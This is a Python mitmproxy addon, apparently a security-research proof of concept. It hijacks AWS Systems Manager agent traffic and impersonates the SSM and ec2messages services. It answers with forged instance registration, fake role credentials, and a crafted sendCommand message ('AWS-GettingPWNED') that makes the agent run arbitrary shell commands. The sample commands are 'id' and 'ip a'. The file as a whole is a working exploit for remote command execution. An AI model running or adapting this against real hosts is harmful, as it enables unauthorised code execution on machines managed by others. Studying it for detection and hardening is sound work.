import json
from mitmproxy import http
import time
import datetime
from uuid import uuid1

logfile = open('/tmp/log.txt', 'w+')
logfile.write('==================\n')

server_ctx = {}

REGION = 'us-east-1'
INSTANCE_ID = 'mi-12345678912345678'

COMMAND_TO_EXECUTE_1 = "id > /tmp/first_cmd_output.txt"
COMMAND_TO_EXECUTE_2 = "ip a > /tmp/second_cmd_output.txt"

def log(s):
    logfile.write(str(s)+'\n')
    logfile.flush()

def respond_json(flow, js, status=200):
    flow.response = http.Response.make(
        status,
        json.dumps(js),
        {"Content-Type": "application/json"}
    )

def get_request_vars(flow):
    content = flow.request.content
    log(content)
    return json.loads(content)

def random_uuid():
    return str(uuid1())

class SSMHijacker:
    def request(self, flow: http.HTTPFlow) -> None:
        log('Got request')
        log(str(flow.request))
        if flow.request.url.startswith('https://ssm.%s.amazonaws.com/' % REGION):
            self.handle_ssm_req(flow)
        if flow.request.url.startswith('https://ssmmessages.%s.amazonaws.com/v1/control-channel/' % REGION):
            self.handle_ssmmessages_req(flow)
        if flow.request.url.startswith('https://ec2messages.%s.amazonaws.com/' % REGION):
            self.handle_ec2_messages(flow)

    def __init__(self, *args, **kwargs):
        super(SSMHijacker, self).__init__()

        self.ssm_handlers = {
            'AmazonSSM.ListInstanceAssociations': self.handle_list_associations,
            'AmazonSSM.RegisterManagedInstance': self.handle_register_instance,
            'AmazonSSM.RequestManagedInstanceRoleToken': self.handle_request_role_token,
            'AmazonSSM.UpdateInstanceInformation': self.handle_update_instance_info
        }

        self.messages_handlers = {
            'EC2WindowsMessageDeliveryService.GetMessages': self.handle_get_messages,
            'EC2WindowsMessageDeliveryService.SendReply': self.handle_send_reply
        }

    def handle_ec2_messages(self, flow: http.HTTPFlow) -> None:
        if 'X-Amz-Target' in flow.request.headers:
            target = flow.request.headers['X-Amz-Target']
            log(target)
            if target in self.messages_handlers:
                self.messages_handlers[target](flow)
            else:
                log("Got invalid handler request")
                respond_json(flow, {}, status=501)

    def handle_get_messages(self, flow: http.HTTPFlow) -> None:
        req_vars = get_request_vars(flow)
        req_id = req_vars['MessagesRequestId']
        req_destination = req_vars['Destination']

        # Copy pasted from the "Content" of the document from the SSM menu, over at:
        # https://us-east-1.console.aws.amazon.com/systems-manager/documents/AWS-RunShellScript/content?region=us-east-1
        aws_run_shell_script_document = '{"schemaVersion": "1.2", "description": "Run a shell script or specify the commands to run.", "parameters": {"commands": {"type": "StringList", "description": "(Required) Specify a shell script or a command to run.", "minItems": 1, "displayType": "textarea"}, "workingDirectory": {"type": "String", "default": "", "description": "(Optional) The path to the working directory on your instance.", "maxChars": 4096}, "executionTimeout": {"type": "String", "default": "3600", "description": "(Optional) The time in seconds for a command to complete before it is considered to have failed. Default is 3600 (1 hour). Maximum is 172800 (48 hours).", "allowedPattern": "([1-9][0-9]{0,4})|(1[0-6][0-9]{4})|(17[0-1][0-9]{3})|(172[0-7][0-9]{2})|(172800)"}}, "runtimeConfig": {"aws:runShellScript": {"properties": [{"id": "0.aws:runShellScript", "runCommand": "{{ commands }}", "workingDirectory": "{{ workingDirectory }}", "timeoutSeconds": "{{ executionTimeout }}"}]}}}'
        aws_run_shell_script_document = json.loads(aws_run_shell_script_document)

        send_command_payload = {
            'CommandID': random_uuid(),
            'DocumentName': 'AWS-GettingPWNED',
            'Parameters': {
                'workingDirectory': '',
                'commands': [COMMAND_TO_EXECUTE_1, COMMAND_TO_EXECUTE_2]
            },
            'DocumentContent': aws_run_shell_script_document
        }

        create_date = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"  # Created now

        d = {
            'Messages': [
                {
                    'Payload': json.dumps(send_command_payload),
                    'CreatedDate': create_date,
                    'Destination': req_destination,
                    'MessageId': random_uuid(),
                    'Topic': 'aws.ssm.sendCommand.%s.1' % REGION.replace('-','.')
                },
            ],
            'Destination': req_destination,
            'MessagesRequestId': req_id
        }

        respond_json(flow, d)

    def handle_send_reply(self, flow: http.HTTPFlow) -> None:
        respond_json(flow, {})

    def handle_ssmmessages_req(self, flow: http.HTTPFlow) -> None:
        respond_json(flow, {}, status=502)

    def handle_ssm_req(self, flow: http.HTTPFlow) -> None:
        if 'X-Amz-Target' in flow.request.headers:
            target = flow.request.headers['X-Amz-Target']
            log(target)
            if target in self.ssm_handlers:
                self.ssm_handlers[target](flow)
            else:
                log("Got invalid handler request")
                respond_json(flow, {}, status=500)

    def handle_register_instance(self, flow: http.HTTPFlow) -> None:
        log('Got RegisterManagedInstance')
        d = {
            'InstanceId': INSTANCE_ID
        }

        respond_json(flow, d)

    def handle_request_role_token(self, flow: http.HTTPFlow) -> None:
        AccessKeyId = "ASIAFAKEACCESSKEYID1"
        SecretAccessKey = "FAKESECRETACCESSKEY123456789012345678901"
        SessionToken  = "FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN1234567890FAKESESSIONTOKEN"

        TokenExpirationDate = int(time.time()) + 60*60*12  # Make the token active for 12 hours

        mock = {
            'AccessKeyId': AccessKeyId,
            'SecretAccessKey': SecretAccessKey,
            'SessionToken': SessionToken,
            'TokenExpirationDate': TokenExpirationDate,
            'UpdateKeyPair': False
        }

        respond_json(flow, mock)

    def handle_update_instance_info(self, flow: http.HTTPFlow) -> None:
        # The natural response is simply an empty one
        d = {}
        respond_json(flow, d)

    def handle_list_associations(self, flow: http.HTTPFlow) -> None:
        d = {
            'Assocations': []
        }
        respond_json(flow, d)

addons = [SSMHijacker()]
